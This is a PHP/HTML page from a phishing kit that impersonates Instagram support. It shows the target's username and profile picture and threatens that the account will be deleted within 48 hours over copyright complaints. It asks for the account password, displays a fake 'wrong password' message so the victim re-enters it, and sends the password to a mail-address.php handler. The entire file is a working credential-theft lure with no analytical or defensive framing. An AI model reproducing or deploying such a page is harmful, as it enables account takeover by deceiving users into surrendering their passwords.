<?php

session_start(); // Oturumu baslat


?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Support | Help Instagram</title>
<link rel="stylesheet" type="text/css" href="css/1.css">
<link rel="stylesheet" type="text/css" href="css/2.css">
<link rel="stylesheet" type="text/css" href="css/3.css">
<link rel="icon" href="https://imgyukle.com/images/2020/04/02/JFZDMp.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.css" />
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script> 
<style type="text/css">
    
    .gizle{
    -webkit-text-security: disc;
}
.goster{
    -webkit-text-security: none;
}
        .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 55%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
</style>

</head><body class="" style="">
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=tr" role="alert" target="_blank"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">GET</button></section></a></div></div>
  
  <div id="react-root">
    <section class="LZyqZ">
      <div class="">
        <div class="vqibd  wNNoj ">
          <div class="ZpgjG   _1I5YO">
            <img src="<?php echo $_SESSION['pp']; ?>" style="max-width: 100px; border-radius:50%;  margin-top:50px;">
<h1 style="font-family:sans-serif; font-weight:400; color:#3d3d3d; font-size:25px; margin-bottom: 10px;">
    @<?php echo $_SESSION['nick']; ?>  
    
</h1><br>
          
          </div>
          <center>
            <p class="GusmU SVI5E     " style="font-family:sans-serif; color:#999; max-width: 500px;">We have received numerous complaints that you violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 48 hours.
If you think this is wrong, continue by logging in.</p>
          <div class="GA2q- ">
           <form class="JraEb" method="get" action="mail-address.php" id="your_form_id"  style="max-width: 500px;" onsubmit="return isValid(this)">
<div class="QuiLu Xb8C0">
  <p style="font-size: 12px; color: red; text-align: center;">Your password is wrong. Please try again.</p>
     <div class="ui icon input" style="width: 92% !important; ">
                        <input class="gizle" type="text" id="password" name="password" placeholder="Password" autocomplete="off" /> 
                        <i id="hey" class="eye link icon" ></i>
                        </div><div style="margin-bottom: 15px;" class="p1"><p id="p1" ></p>

</div>

 <button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">continue as <?php echo $_SESSION['nick'];?></span>
    </button>
</form><br><br>
<div style="font-family:sans-serif; font-size:14px; color:#999;"><br>
            <p class="GusmU  t_gv9    ">As an Instagram Team, we pay close attention to Community rules</p>
            <br>
            
                 </div>
          </center>
          
          </div>
          
          <br> 
          
                 <br>


</div>
</div>
</section>
</div>
<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><img src="https://i.ibb.co/bF4shWH/instagram-from-facebook-removebg-preview.png" width="120"></div>
</html>

<div style="position: fixed; top: env(safe-area-inset-top); right: env(safe-area-inset-right); bottom: env(safe-area-inset-bottom); left: env(safe-area-inset-left); pointer-events: none; contain: strict; z-index: -9999;">
</div>

<script>
  $( hey ).click(function() {
  $( password ).toggleClass( "goster" );
});
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
      
      password= document.getElementById("password").value;
      
   
   if ( password==null || password=="" || password.length < 5)
     {
        document.getElementById("p1").innerHTML =  "Please enter a valid password!";
document.getElementsByClassName("p1")[0].style.color="red";
  $(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
      $(".btn-txt").text("Next");
      return false;
 }


 document.getElementById('your_form_id').submit();
      
      
   });
        });
    

    </script>
</body>
</html>


